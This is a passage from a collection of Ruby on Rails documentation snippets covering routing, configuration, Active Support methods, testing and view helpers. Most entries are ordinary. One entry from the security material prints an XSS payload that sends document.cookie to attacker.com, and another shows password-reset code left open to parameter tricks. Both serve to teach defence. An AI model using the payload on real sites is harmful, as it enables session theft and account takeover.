DESCRIPTION: Example of declaring a custom route using the PUT HTTP method in Rails routes. This pattern requires changes when upgrading to Rails 4.

LANGUAGE: ruby
CODE:
resources :users do
  put :update_name, on: :member
end

----------------------------------------

TITLE: Configuring PostgreSQL Database in Rails
DESCRIPTION: This configuration shows the basic setup for a PostgreSQL database in the development environment. It specifies the adapter, encoding, database name, and connection pool size.

LANGUAGE: yaml
CODE:
development:
  adapter: postgresql
  encoding: unicode
  database: blog_development
  pool: 5

----------------------------------------

TITLE: Prefixing Multiple Route Helpers with scope :as Option
DESCRIPTION: Demonstrates how to prefix a group of route helpers using the :as option with scope. This technique applies the same prefix to all resources defined within the scope block.

LANGUAGE: ruby
CODE:
scope "admin", as: "admin" do
  resources :photos, :accounts
end

resources :photos, :accounts

----------------------------------------

TITLE: Resulting Params Hash from Indexed Fields Form
DESCRIPTION: Illustrates the structure of the params hash that results from submitting a form with indexed fields. The hash maintains the association between addresses and their IDs.

LANGUAGE: ruby
CODE:
{
  "person" => {
    "name" => "Bob",
    "address" => {
      "23" => {
        "city" => "Paris"
      },
      "45" => {
        "city" => "London"
      }
    }
  }
}

----------------------------------------

TITLE: Using beginning_of_minute and end_of_minute with DateTime objects in Ruby on Rails
DESCRIPTION: These methods return timestamps at the beginning (hh:mm:00) and end (hh:mm:59) of the minute. The beginning_of_minute method has an alias at_beginning_of_minute.

LANGUAGE: ruby
CODE:
date = DateTime.new(2010, 6, 7, 19, 55, 25)
date.beginning_of_minute # => Mon Jun 07 19:55:00 +0200 2010

LANGUAGE: ruby
CODE:
date = DateTime.new(2010, 6, 7, 19, 55, 25)
date.end_of_minute # => Mon Jun 07 19:55:59 +0200 2010

----------------------------------------

TITLE: Using after_save_commit for Both Create and Update
DESCRIPTION: Better approach using after_save_commit which is an alias for after_commit that fires on both create and update actions, ensuring the callback is triggered in both scenarios.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  after_save_commit :log_user_saved_to_db

  private
    def log_user_saved_to_db
      Rails.logger.info("User was saved to database")
    end
end

----------------------------------------

TITLE: Updating Article Model to Use Configurable Author Class
DESCRIPTION: Modifies the author association in the Article model to use the configurable author_class setting instead of hardcoding the User class.

LANGUAGE: ruby
CODE:
belongs_to :author, class_name: Blorgh.author_class

----------------------------------------

TITLE: Creating a basic custom Rake task in Rails
DESCRIPTION: Define a custom Rake task with dependencies on other tasks. The task includes a description that will be displayed when listing available tasks with rake -T.

LANGUAGE: ruby
CODE:
desc "I am short, but comprehensive description for my cool task"
task task_name: [:prerequisite_task, :another_task_we_depend_on] do
  # All your magic here
  # Any valid Ruby code is allowed
end

----------------------------------------

TITLE: Configuring Test Parallelization Threshold in Rails Configuration
DESCRIPTION: Sets the minimum number of tests required before Rails will parallelize test execution. This helps avoid the overhead of parallelization for small test suites.

LANGUAGE: ruby
CODE:
config.active_support.test_parallelization_threshold = 100

----------------------------------------

TITLE: Using excluding in Ruby on Rails
DESCRIPTION: The excluding method returns a copy of an enumerable with the specified elements removed. It's aliased to without. Defined in active_support/core_ext/enumerable.rb.

LANGUAGE: ruby
CODE:
["David", "Rafael", "Aaron", "Todd"].excluding("Aaron", "Todd") # => ["David", "Rafael"]

----------------------------------------

TITLE: Generating a New Rails Plugin with Plugin Generator
DESCRIPTION: Command to generate a basic Rails plugin structure with a name 'yaffle'. This creates a skeleton for developing a Rails extension with the ability to run integration tests using a dummy Rails application.

LANGUAGE: bash
CODE:
$ rails plugin new yaffle

----------------------------------------

TITLE: Using Strict Validations in Rails
DESCRIPTION: Demonstrates how to use strict validations that raise ActiveModel::StrictValidationFailed exceptions when validation fails, instead of just adding to the errors collection. This is useful for scenarios where invalid data should halt processing.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validates :name, presence: { strict: true }
end

----------------------------------------

TITLE: Vulnerable Password Reset Code Example in Rails
DESCRIPTION: This code snippet demonstrates a vulnerability where an attacker could bypass the nil check using specially crafted parameters, leading to unexpected database queries with IS NULL clauses if deep_munge protection is not applied.

LANGUAGE: ruby
CODE:
unless params[:token].nil?
  user = User.find_by_token(params[:token])
  user.reset_password!
end

----------------------------------------

TITLE: Array to_query Implementation in Rails
DESCRIPTION: Demonstrates how Array#to_query appends empty brackets to the key and applies to_query to each element, joining the results with an ampersand.

LANGUAGE: ruby
CODE:
[3.4, -45.6].to_query("sample")
# => "sample%5B%5D=3.4&sample%5B%5D=-45.6"

----------------------------------------

TITLE: Creating an Associated Object with Validation and Error Handling in Ruby on Rails
DESCRIPTION: Code example showing how to create an author with validation and handle errors. The create_association! method raises an exception if the record is invalid.

LANGUAGE: ruby
CODE:
# This will raise ActiveRecord::RecordInvalid because the name is blank
begin
  @book.create_author!(author_number: 123, name: "")
rescue ActiveRecord::RecordInvalid => e
  puts e.message
end

----------------------------------------

TITLE: Checking Rails Version in Terminal
DESCRIPTION: Command to verify the installed version of Rails in your system. The expected output should be Rails 8.1.0 or higher for this tutorial.

LANGUAGE: bash
CODE:
$ rails --version
Rails 8.1.0

----------------------------------------

TITLE: Retrieving IDs of has_many Associated Objects in Rails
DESCRIPTION: Example of getting an array of primary key values for all objects in the collection. This provides a list of all book IDs belonging to the author.

LANGUAGE: ruby
CODE:
@book_ids = @author.book_ids

----------------------------------------

TITLE: Incorrect Usage of return in Rails Callback Blocks
DESCRIPTION: Example of incorrect usage of the return statement in a callback block. This pattern was previously allowed but now causes a LocalJumpError in Rails 4.1.

LANGUAGE: ruby
CODE:
class ReadOnlyModel < ActiveRecord::Base
  before_save { return false } # BAD
end

----------------------------------------

TITLE: Default English Locale Configuration in Rails
DESCRIPTION: Shows the default English locale configuration in the Rails locales YAML file. The 'hello' key is mapped to 'Hello world' in the English language.

LANGUAGE: yaml
CODE:
en:
  hello: "Hello world"

----------------------------------------

TITLE: Using HTML Safe Translations with Interpolation
DESCRIPTION: Demonstrates safe interpolation of user-provided data into HTML safe translations, where the interpolated content will be properly escaped as needed.

LANGUAGE: erb
CODE:
<%# This is safe, it is going to be escaped if needed. %>
<%= t('welcome_html', username: @current_user.username) %>

----------------------------------------

TITLE: Using tag Helper with CSS Classes in Rails
DESCRIPTION: Example showing how to use the tag helper with CSS class attributes, demonstrating how to pass options to add attributes to the generated HTML tag.

LANGUAGE: ruby
CODE:
tag.section class: %w( kitties puppies )

----------------------------------------

TITLE: Conditional Implementation for Framework Defaults in Rails
DESCRIPTION: Shows how to conditionally implement old and new behavior based on a framework default setting. This allows Rails applications to opt into new behavior explicitly.

LANGUAGE: ruby
CODE:
def changed_method
  if ActiveJob.existing_behavior
    # Existing behavior
  else
    # New behavior
  end
end

----------------------------------------

TITLE: Configuring Multiple Mailer Preview Paths in Ruby
DESCRIPTION: Configuration to add additional paths for ActionMailer::Preview in Rails 7.1+. This replaces the deprecated preview_path option with the new preview_paths collection.

LANGUAGE: ruby
CODE:
config.action_mailer.preview_paths << "#{Rails.root}/lib/mailer_previews"

----------------------------------------

TITLE: Console Example of after_save_commit
DESCRIPTION: IRB console example showing how after_save_commit triggers for both create and update operations, executing the callback in both scenarios.

LANGUAGE: ruby
CODE:
irb> user = User.create # creating a User
User was saved to database

irb> user.save # updating user
User was saved to database

----------------------------------------

TITLE: Configuring Asset Timestamp Caching in Rails
DESCRIPTION: This Ruby code shows how to enable caching of asset timestamps in Rails production environment. This optimizes file system calls but means you can't modify assets while the server is running.

LANGUAGE: ruby
CODE:
config.action_view.cache_template_loading = true

----------------------------------------

TITLE: Opting Out of Test Transactions in Rails
DESCRIPTION: Shows how to disable automatic transaction wrapping for individual test cases by setting use_transactional_tests to false.

LANGUAGE: ruby
CODE:
class MyTest < ActiveSupport::TestCase
  # No implicit database transaction wraps the tests in this test case.
  self.use_transactional_tests = false
end

----------------------------------------

TITLE: Configuring Sanitized Allowed Tags in Rails Application
DESCRIPTION: Configuration for setting allowed HTML tags in the sanitize method. This snippet shows how to configure the application to allow specific HTML tags (table, tr, td) through the sanitization process.

LANGUAGE: ruby
CODE:
# config/application.rb
class Application < Rails::Application
  config.action_view.sanitized_allowed_tags = %w(table tr td)
end

----------------------------------------

TITLE: Creating a custom Rake task with arguments in Rails
DESCRIPTION: Define a Rake task that accepts arguments. Arguments are passed to the task block as a second parameter, allowing for more flexible and reusable tasks.

LANGUAGE: ruby
CODE:
task :task_name, [:arg_1] => [:prerequisite_1, :prerequisite_2] do |task, args|
  argument_1 = args.arg_1
end

----------------------------------------

TITLE: Running Active Record Tests for SQLite3
DESCRIPTION: Shows how to run the Active Record test suite specifically for the SQLite3 adapter. SQLite3 doesn't require a separate database setup step.

LANGUAGE: bash
CODE:
$ cd activerecord
$ bundle exec rake test:sqlite3

----------------------------------------

TITLE: Using ago and since with Date objects in Ruby on Rails
DESCRIPTION: These methods receive a number of seconds as argument and return a timestamp that many seconds ago from midnight (ago) or after midnight (since).

LANGUAGE: ruby
CODE:
date = Date.current # => Fri, 11 Jun 2010
date.ago(1)         # => Thu, 10 Jun 2010 23:59:59 EDT -04:00

LANGUAGE: ruby
CODE:
date = Date.current # => Fri, 11 Jun 2010
date.since(1)       # => Fri, 11 Jun 2010 00:00:01 EDT -04:00

----------------------------------------

TITLE: Running Tests for a Specific File in Rails
DESCRIPTION: Shows how to run tests for a specific file in a Rails component. This example runs tests in the form_helper_test.rb file in the Action View component.

LANGUAGE: bash
CODE:
$ cd actionview
$ bin/test test/template/form_helper_test.rb

----------------------------------------

TITLE: Installing Ruby Gem Dependencies with Bundler
DESCRIPTION: Command to install all Ruby gem dependencies specified in the Rails Gemfile using Bundler. This installs all the gems needed for Rails development.

LANGUAGE: bash
CODE:
$ bundle install

----------------------------------------

TITLE: Configuring Active Job Serializers
DESCRIPTION: Setting up a custom serializer for Active Job that shouldn't be reloadable since the reference to the serializer object remains even after code reloads.

LANGUAGE: ruby
CODE:
# config/initializers/custom_serializers.rb
Rails.application.config.active_job.custom_serializers << MoneySerializer

----------------------------------------

TITLE: Mapping Root URLs with Locale in Rails
DESCRIPTION: Route configuration that handles locale-specific root URLs like /en or /nl, directing them to the appropriate controller action.

LANGUAGE: ruby
CODE:
# config/routes.rb
get "/:locale" => "dashboard#index"

----------------------------------------

TITLE: Basic Usage of with_options Method
DESCRIPTION: Shows how to reduce duplication in Rails code by factoring out common options using with_options, demonstrated on ActiveRecord associations.

LANGUAGE: ruby
CODE:
class Account < ApplicationRecord
  has_many :customers, dependent: :destroy
  has_many :products,  dependent: :destroy
  has_many :invoices,  dependent: :destroy
  has_many :expenses,  dependent: :destroy
end

----------------------------------------

TITLE: Configuring Parallel Testing with Setup and Teardown Hooks in Rails
DESCRIPTION: Advanced configuration for parallel testing in Rails, demonstrating how to use parallelize_setup and parallelize_teardown hooks for database setup and cleanup in parallel test processes.

LANGUAGE: ruby
CODE:
class ActiveSupport::TestCase
  parallelize_setup do |worker|
    # setup databases
  end

  parallelize_teardown do |worker|
    # cleanup databases
  end

  parallelize(workers: :number_of_processors)
end

----------------------------------------

TITLE: Using Engineering Notation with BigDecimal in Ruby on Rails
DESCRIPTION: Even with the modified to_s method, engineering notation is still supported by passing the 'e' parameter to the method.

LANGUAGE: ruby
CODE:
BigDecimal(5.00, 6).to_s("e")  # => "0.5E1"

----------------------------------------

TITLE: Cookie Theft via External Image Request
DESCRIPTION: A malicious XSS payload that steals cookies by creating an image request to an attacker-controlled server with the cookie data appended to the URL. This allows the attacker to capture the cookie in their server logs.

LANGUAGE: html
CODE:
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>

----------------------------------------

TITLE: Using Message Verifiers in Rails 4.1
DESCRIPTION: Example of using Message Verifiers to generate and verify signed messages. This feature is useful for safely transporting sensitive data like remember-me tokens.

LANGUAGE: ruby
CODE:
signed_token = Rails.application.message_verifier(:remember_me).generate(token)
Rails.application.message_verifier(:remember_me).verify(signed_token) # => token

Rails.application.message_verifier(:remember_me).verify(tampered_token)
# raises ActiveSupport::MessageVerifier::InvalidSignature

----------------------------------------

TITLE: Viewing Generator Help
DESCRIPTION: Command to display help information for the custom initializer generator.

LANGUAGE: bash
CODE:
$ bin/rails generate initializer --help

----------------------------------------

TITLE: Using picture_tag Helper in Rails
DESCRIPTION: Example of using picture_tag to generate HTML picture tags with multiple source elements for different image formats, supporting responsive images and format fallbacks.

LANGUAGE: ruby
CODE:
picture_tag("icon.webp", "icon.png")

----------------------------------------

TITLE: Using positional element access methods in Ruby on Rails Array extensions
DESCRIPTION: Rails provides convenient methods to access array elements by position, including second, third, fourth, fifth, second_to_last, third_to_last, and even forty_two. Defined in active_support/core_ext/array/access.rb.

LANGUAGE: ruby
CODE:
%w(a b c d).third # => "c"
%w(a b c d).fifth # => nil

----------------------------------------

TITLE: Registering custom annotation tags in Rails configuration
DESCRIPTION: You can add custom annotation tags to be recognized by the rails notes command by adding them to the configuration. This allows for project-specific annotation conventions.

LANGUAGE: ruby
CODE:
config.annotations.register_tags("DEPRECATEME", "TESTME")

----------------------------------------

TITLE: Running Rails Tests in Continuous Integration
DESCRIPTION: Command for running all non-system tests in a CI environment. This is the basic command to run the standard test suite in Rails applications.

LANGUAGE: bash
CODE:
$ bin/rails test

----------------------------------------

TITLE: Using module_parent for Module Introspection
DESCRIPTION: Shows how to use module_parent to get the parent module of a nested module, useful for module introspection and reflection.

LANGUAGE: ruby
CODE:
module X
  module Y
    module Z
    end
  end
end
M = X::Y::Z

X::Y::Z.module_parent # => X::Y
M.module_parent       # => X::Y

----------------------------------------

TITLE: Setting Up Local Tracking Branches for Older Rails Versions
DESCRIPTION: This snippet demonstrates how to set up and switch to a local tracking branch for an older version of Rails (7-0-stable in this example). This is necessary when you want to fix issues in versions other than the next release.

LANGUAGE: bash
CODE:
$ git branch --track 7-0-stable rails/7-0-stable
$ git checkout 7-0-stable

----------------------------------------

TITLE: Demonstrating String#pluralize Method in Ruby on Rails
DESCRIPTION: Examples showing how the pluralize method transforms singular words to plural form, handling regular and irregular words appropriately.

LANGUAGE: ruby
CODE:
"table".pluralize    # => "tables"
"ruby".pluralize     # => "rubies"
"equipment".pluralize # => "equipment"

----------------------------------------

TITLE: Creating Atom Feeds in Rails with atom_feed Helper
DESCRIPTION: The atom_feed helper simplifies Atom feed generation in Rails. It is used in Builder templates to create XML-based syndication feeds for content distribution and search engine discovery.

LANGUAGE: ruby
CODE:
# config/routes.rb
resources :articles

LANGUAGE: ruby
CODE:
# app/controllers/articles_controller.rb
def index
  @articles = Article.all

  respond_to do |format|
    format.html
    format.atom
  end
end

LANGUAGE: ruby
CODE:
# app/views/articles/index.atom.builder
atom_feed do |feed|
  feed.title("Articles Index")
  feed.updated(@articles.first.created_at)

  @articles.each do |article|
    feed.entry(article) do |entry|
      entry.title(article.title)
      entry.content(article.body, type: "html")

      entry.author do |author|
        author.name(article.author_name)
      end
    end
  end
end

----------------------------------------

TITLE: Overriding Conditions with unscope in ActiveRecord
DESCRIPTION: Shows how to use the 'unscope' method to remove specific parts of a query, such as order clauses or specific where conditions.

LANGUAGE: ruby
CODE:
Book.where("id > 100").limit(20).order("id desc").unscope(:order)

LANGUAGE: sql
CODE:
SELECT * FROM books WHERE id > 100 LIMIT 20

-- Original query without `unscope`
SELECT * FROM books WHERE id > 100 ORDER BY id desc LIMIT 20

LANGUAGE: ruby
CODE:
Book.where(id: 10, out_of_print: false).unscope(where: :id)
# SELECT books.* FROM books WHERE out_of_print = 0

LANGUAGE: ruby
CODE:
Book.order("id desc").merge(Book.unscope(:order))
# SELECT books.* FROM books

----------------------------------------

TITLE: Starting Rails Server After Authentication Setup
DESCRIPTION: Command to restart the Rails server after adding the bcrypt gem for password hashing through the authentication generator.

LANGUAGE: bash
CODE:
$ bin/rails server

----------------------------------------

TITLE: Creating and Saving Associated Objects in has_many Relationship in Rails
DESCRIPTION: Examples of creating new associated objects that are instantiated and saved to the database. This creates and saves new book objects with the author association set.

LANGUAGE: ruby
CODE:
@book = @author.books.create(published_at: Time.now,
                             book_number: "A12345")

@books = @author.books.create([
  { published_at: Time.now, book_number: "A12346" },
  { published_at: Time.now, book_number: "A12347" }
])

----------------------------------------

TITLE: Initializing Rails Server Class
DESCRIPTION: Defines the Rails::Server class that inherits from Rackup::Server, setting up default options and configuring the environment.

LANGUAGE: ruby
CODE:
module Rails
  class Server < Rackup::Server
    def initialize(options = nil)
      @default_options = options || {}
      super(@default_options)
      set_environment
    end
  end
end

----------------------------------------

TITLE: Configuring Exim to Pipe Emails to Action Mailbox
DESCRIPTION: Command to configure Exim to forward incoming emails to Action Mailbox using the relay ingress. This command specifies the URL and authentication password.

LANGUAGE: bash
CODE:
$ bin/rails action_mailbox:ingress:exim URL=https://example.com/rails/action_mailbox/relay/inbound_emails INGRESS_PASSWORD=...

----------------------------------------

TITLE: Simple Redirection in Rails Routes
DESCRIPTION: Demonstrates how to redirect one path to another using the redirect helper in routes. This creates a 301 (permanent) redirect from /stories to /articles.

LANGUAGE: ruby
CODE:
get "/stories", to: redirect("/articles")

----------------------------------------

TITLE: Defining the Entryable Module in Ruby on Rails
DESCRIPTION: Creates an Entryable module that implements a polymorphic association with the has_one :entry relationship. This module can be included in different models to make them entryable.

LANGUAGE: ruby
CODE:
module Entryable
  extend ActiveSupport::Concern

  included do
    has_one :entry, as: :entryable, touch: true
  end
end

----------------------------------------

TITLE: Using Spacer Templates in Rails Collection Rendering
DESCRIPTION: Shows how to specify a secondary partial to be rendered between instances of the main partial when rendering collections using the spacer_template option.

LANGUAGE: erb
CODE:
<%= render partial: @products, spacer_template: "product_ruler" %>

----------------------------------------

TITLE: Using index_with in Ruby on Rails
DESCRIPTION: The index_with method generates a hash with the elements of an enumerable as keys. The value is either a passed default or returned in a block. Defined in active_support/core_ext/enumerable.rb.

LANGUAGE: ruby
CODE:
post = Post.new(title: "hey there", body: "what's up?")

%i( title body ).index_with { |attr_name| post.public_send(attr_name) }
# => { title: "hey there", body: "what's up?" }

WEEKDAYS.index_with(Interval.all_day)
# => { monday: [ 0, 1440 ], â¦ }

----------------------------------------

TITLE: Mounting Rack Applications in Rails Routes
DESCRIPTION: Shows how to mount a Rack application at a specific path using the mount method. This makes the Rack application receive requests at its root path relative to the mounting point.

LANGUAGE: ruby
CODE:
mount AdminApp, at: "/admin"

----------------------------------------

TITLE: Using String#squish Method in Ruby
DESCRIPTION: Shows the squish method which strips leading and trailing whitespace and compresses runs of whitespace into a single space.

LANGUAGE: ruby
CODE:
" \n  foo\n\r \t bar \n".squish # => "foo bar"

----------------------------------------

TITLE: Installing Dependencies on Fedora or CentOS
DESCRIPTION: Commands to install all required dependencies for Rails development on Fedora or CentOS, including database systems, Redis, memcached, and tools for image/video processing. Also includes steps to install Node.js and Yarn.

LANGUAGE: bash
CODE:
$ sudo dnf install sqlite-devel sqlite-libs mysql-server mysql-devel postgresql-server postgresql-devel redis memcached ImageMagick ffmpeg mupdf libxml2-devel vips poppler-utils

# Install Yarn
# Use this command if you do not have Node.js installed
# ref: https://github.com/nodesource/distributions#installation-instructions-1
$ sudo dnf install https://rpm.nodesource.com/pub_20/nodistro/repo/nodesource-release-nodistro-1.noarch.rpm -y
$ sudo dnf install nodejs -y --setopt=nodesource-nodejs.module_hotfixes=1

# Once you have installed Node.js, install the yarn npm package
$ sudo npm install --global yarn

----------------------------------------

TITLE: Configuring PostgreSQL Schema Dump Options
DESCRIPTION: Rails 5 allows control over how PostgreSQL schemas are dumped when using schema_search_path or other extensions. This configuration sets it to dump all schemas.

LANGUAGE: ruby
CODE:
config.active_record.dump_schemas = :all

----------------------------------------

TITLE: Implementing Rack::Builder Methods for Application Loading in Ruby
DESCRIPTION: The Rack::Builder methods that parse and load the Rails application from a configuration file, creating a Rack-compatible application.

LANGUAGE: ruby
CODE:
module Rack
  class Builder
    def self.load_file(path, **options)
      # ...
      new_from_string(config, path, **options)
    end

    # ...

    def self.new_from_string(builder_script, path = "(rackup)", **options)
      builder = self.new(**options)

      # We want to build a variant of TOPLEVEL_BINDING with self as a Rack::Builder instance.
      # We cannot use instance_eval(String) as that would resolve constants differently.
      binding = BUILDER_TOPLEVEL_BINDING.call(builder)
      eval(builder_script, binding, path)

      builder.to_app
    end
  end
end

----------------------------------------

TITLE: Autosave Failures with Custom Associations in Rails
DESCRIPTION: Demonstrates how custom associations without proper inverse_of configuration can fail to automatically save parent records when child records are saved, leading to data integrity issues.

LANGUAGE: ruby
CODE:
irb> author = Author.new
irb> book = author.books.new
irb> book.save!
irb> book.persisted?
=> true
irb> author.persisted?
=> false

----------------------------------------

TITLE: Generating a System Test in Rails using CLI
DESCRIPTION: Command to generate a system test skeleton for an 'articles' resource using the Rails generator. This creates a test file in the test/system directory.

LANGUAGE: bash
CODE:
$ bin/rails generate system_test articles

----------------------------------------

TITLE: Using to_prepare to Configure Reloadable Classes
DESCRIPTION: The correct approach to configure a reloadable class on boot and after each reload using to_prepare callback. This ensures the configuration is applied after every code reload.

LANGUAGE: ruby
CODE:
# config/initializers/api_gateway_setup.rb
Rails.application.config.to_prepare do
  ApiGateway.endpoint = "https://example.com" # CORRECT
end

----------------------------------------

TITLE: Adding Gem Sources with add_source Method
DESCRIPTION: Examples of adding custom gem sources to the Gemfile using the add_source method, with both simple source addition and block syntax for grouping gems.

LANGUAGE: ruby
CODE:
add_source "http://gems.github.com"

LANGUAGE: ruby
CODE:
add_source "http://gems.github.com/" do
  gem "rspec-rails"
end

----------------------------------------

TITLE: Loading Complete Active Support in Ruby on Rails
DESCRIPTION: How to load all of Active Support, including features that will be autoloaded only when used.

LANGUAGE: ruby
CODE:
require "active_support/all"

----------------------------------------

TITLE: Using Symbol String-Like Methods in Ruby on Rails
DESCRIPTION: Active Support adds starts_with? and ends_with? methods to Symbol as aliases for start_with? and end_with?, following the pattern of 3rd person naming conventions.

LANGUAGE: ruby
CODE:
:foo.starts_with?("f") # => true
:foo.ends_with?("o")   # => true

----------------------------------------

TITLE: Cache Generation Example Payload in Active Support
DESCRIPTION: Example of the payload data available during a cache_generate.active_support event. This shows the cache key and store class name.

LANGUAGE: ruby
CODE:
{
  key: "name-of-complicated-computation",
  store: "ActiveSupport::Cache::MemCacheStore"
}

----------------------------------------

TITLE: Default Field Error Proc Configuration in Action View
DESCRIPTION: Shows the default configuration for displaying form field errors in Rails. The proc wraps the HTML tag with a div having the 'field_with_errors' class.

LANGUAGE: ruby
CODE:
Proc.new { |html_tag, instance| content_tag :div, html_tag, class: "field_with_errors" }

----------------------------------------

TITLE: Using camelize with Namespace Paths in Ruby on Rails
DESCRIPTION: Example showing how camelize handles paths with slashes, converting them to Ruby namespace format with double colons.

LANGUAGE: ruby
CODE:
"backoffice/session".camelize # => "Backoffice::Session"

----------------------------------------

TITLE: Rendering Plain Text Response
DESCRIPTION: Sending a plain text response without any markup using the :plain option to render. This is useful for AJAX or API responses where HTML is not needed.

LANGUAGE: ruby
CODE:
render plain: "OK"

----------------------------------------

TITLE: Different Ways to Access I18n Translations
DESCRIPTION: Examples of equivalent ways to look up translations using the I18n.t method. Shows various approaches to specifying scope and keys for flexibility in your code.

LANGUAGE: ruby
CODE:
I18n.t "date.formats.short"
I18n.t "formats.short", scope: :date
I18n.t :short, scope: "date.formats"
I18n.t :short, scope: [:date, :formats]

----------------------------------------

TITLE: Configuring MemoryStore Cache in Rails
DESCRIPTION: Sets up a memory-based cache store with a specified size limit. This implementation keeps cache entries in memory within the same Ruby process, with a default size of 32Mb if not specified.

LANGUAGE: ruby
CODE:
config.cache_store = :memory_store, { size: 64.megabytes }

----------------------------------------

TITLE: Basic System Test Skeleton in Rails
DESCRIPTION: The initial structure of a system test that inherits from ApplicationSystemTestCase. This is used for testing user interactions through a browser using Capybara.

LANGUAGE: ruby
CODE:
require "application_system_test_case"

class UsersTest < ApplicationSystemTestCase
  # test "visiting the index" do
  #   visit users_url
  #
  #   assert_dom "h1", text: "Users"
  # end
end

----------------------------------------

TITLE: Implementing ActiveModel Lint Tests in Ruby
DESCRIPTION: This example demonstrates how to set up tests that verify a class complies with the ActiveModel API. It includes the ActiveModel::Lint::Tests module in a test case and sets up the model to be tested.

LANGUAGE: ruby
CODE:
require "test_helper"

class PersonTest < ActiveSupport::TestCase
  include ActiveModel::Lint::Tests

  setup do
    @model = Person.new
  end
end

----------------------------------------

TITLE: Defining Custom Table Name Method in ActiveRecord
DESCRIPTION: Demonstrates how to create a custom table_name class method in ActiveRecord to dynamically set table names based on the default naming convention.

LANGUAGE: ruby
CODE:
class Post < ActiveRecord::Base
  def self.table_name
    "special_" + super
  end
end

Post.table_name # => "special_posts"

----------------------------------------

TITLE: Implementation of raw Helper Method in Ruby
DESCRIPTION: Shows the implementation of the raw helper method which converts content to a string and marks it as HTML safe.

LANGUAGE: ruby
CODE:
def raw(stringish)
  stringish.to_s.html_safe
end

----------------------------------------

TITLE: Configuring New ActiveSupport::Cache Serialization Format in Rails 7
DESCRIPTION: Shows how to enable the new ActiveSupport::Cache serialization format in Rails 7.0 which offers improved performance and compactness, with both manual configuration and using load_defaults.

LANGUAGE: ruby
CODE:
# config/application.rb

config.load_defaults 6.1
config.active_support.cache_format_version = 7.0

----------------------------------------

TITLE: Default Generated ERB Template for Products Index
DESCRIPTION: Shows the default HTML generated by the Rails controller generator for the products/index view, which serves as a placeholder until customized.

LANGUAGE: erb
CODE:
<h1>Products#index</h1>
<p>Find me in app/views/products/index.html.erb</p>

----------------------------------------

TITLE: URL Generation with Custom to_param
DESCRIPTION: Demonstrates how Rails routing uses the custom to_param method to generate a more descriptive URL for a user resource.

LANGUAGE: ruby
CODE:
user_path(@user) # => "/users/357-john-smith"

----------------------------------------

TITLE: Updating Strong Parameters for Rich Text in Rails Controller
DESCRIPTION: Shows how to update the product_params method in the ProductsController to permit the new description parameter for the rich text field.

LANGUAGE: ruby
CODE:
    # Only allow a list of trusted parameters through.
    def product_params
      params.expect(product: [ :name, :description ])
    end

----------------------------------------

TITLE: Manual collection traversal without has_many :through in Rails
DESCRIPTION: Shows how to manually traverse from a document to paragraphs without using has_many :through, demonstrating the extra code needed compared to the direct association approach.

LANGUAGE: ruby
CODE:
paragraphs = []
@document.sections.each do |section|
  paragraphs.concat(section.paragraphs)
end

----------------------------------------

TITLE: Ignoring Multiple Lib Subdirectories
DESCRIPTION: Shows a more comprehensive example of ignoring multiple lib subdirectories that shouldn't be autoloaded or eager loaded.

LANGUAGE: ruby
CODE:
config.autoload_lib(ignore: %w(assets tasks templates generators middleware))

----------------------------------------

TITLE: Creating Forms with Authenticity Token in ERB Templates
DESCRIPTION: This ERB snippet demonstrates how to generate a form with built-in CSRF protection using the form_with helper. Rails automatically includes an authenticity_token as a hidden field in the generated HTML form.

LANGUAGE: erb
CODE:
<%= form_with model: @user do |form| %>
  <%= form.text_field :username %>
  <%= form.text_field :password %>
<% end %>

----------------------------------------

TITLE: Configuring ActionDispatch::DebugLocks Middleware in Rails Application
DESCRIPTION: This code snippet shows how to add the ActionDispatch::DebugLocks middleware to a Rails application configuration. This middleware helps diagnose deadlock conditions by exposing interlock information at the /rails/locks endpoint.

LANGUAGE: ruby
CODE:
config.middleware.insert_before Rack::Sendfile,
                                  ActionDispatch::DebugLocks

----------------------------------------

TITLE: Inspecting Middleware Stack After Modifications
DESCRIPTION: Shows the command to inspect the middleware stack after making configuration changes, which helps verify that changes have been applied correctly.

LANGUAGE: bash
CODE:
$ bin/rails middleware
(in /Users/lifo/Rails/blog)
use ActionDispatch::Static
use #<ActiveSupport::Cache::Strategy::LocalCache::Middleware:0x00000001c304c8>
...
run Rails.application.routes

----------------------------------------

TITLE: Using sanitize_css Method in Rails
DESCRIPTION: Example of sanitizing CSS code with the sanitize_css method, which removes disallowed CSS styles from a string. This is particularly useful for user-generated content with style attributes.

LANGUAGE: ruby
CODE:
sanitize_css("background-color: red; color: white; font-size: 16px;")

----------------------------------------

TITLE: Checking Object Duplicability in Ruby on Rails
DESCRIPTION: Examples showing how duplicable? method can be used to check if objects can be safely duplicated, with examples of various Ruby objects.

LANGUAGE: ruby
CODE:
"foo".duplicable?           # => true
"".duplicable?              # => true
Rational(1).duplicable?     # => true
Complex(1).duplicable?      # => true
1.method(:+).duplicable?    # => false

----------------------------------------

TITLE: Configuring autoload_lib with ignored subdirectories in Rails
DESCRIPTION: This snippet shows how to add the lib directory to autoload_paths and eager_load_paths while ignoring specific subdirectories. It prevents directories like assets, tasks, and generators from being autoloaded.

LANGUAGE: ruby
CODE:
config.autoload_lib(ignore: %w(assets tasks generators))

----------------------------------------

TITLE: Implementing Rails::Application#initialize! Method in Ruby
DESCRIPTION: The initialize! method of Rails::Application that runs all the initializers and sets the application as initialized.

LANGUAGE: ruby
CODE:
def initialize!(group = :default) # :nodoc:
  raise "Application has been already initialized." if @initialized
  run_initializers(group, self)
  @initialized = true
  self
end

----------------------------------------

TITLE: Adding Author Association to Article Model
DESCRIPTION: Enhances the Article model with an author_name accessor, an author association to the User class, and a before_validation hook to set the author based on the provided name.

LANGUAGE: ruby
CODE:
attr_accessor :author_name
belongs_to :author, class_name: "User"

before_validation :set_author

private
  def set_author
    self.author = User.find_or_create_by(name: author_name)
  end

----------------------------------------

TITLE: Using Test Macro for Readable Test Names
DESCRIPTION: Demonstrates using the Rails test macro which provides a more readable way to write tests compared to the traditional method definition approach.

LANGUAGE: ruby
CODE:
test "the truth" do
  assert true
end

----------------------------------------

TITLE: Zeroing Hours in DateTime with Ruby
DESCRIPTION: When zeroing hours with the change method, minutes and seconds are automatically zeroed too unless explicitly specified.

LANGUAGE: ruby
CODE:
now.change(hour: 0)
# => Tue, 08 Jun 2010 00:00:00 +0000

----------------------------------------

TITLE: Testing Multiple Validation Contexts in Rails Console
DESCRIPTION: Demonstrates how validations with multiple contexts behave in Rails console, showing that validations only run when the specific context is triggered, not during normal validation.

LANGUAGE: ruby
CODE:
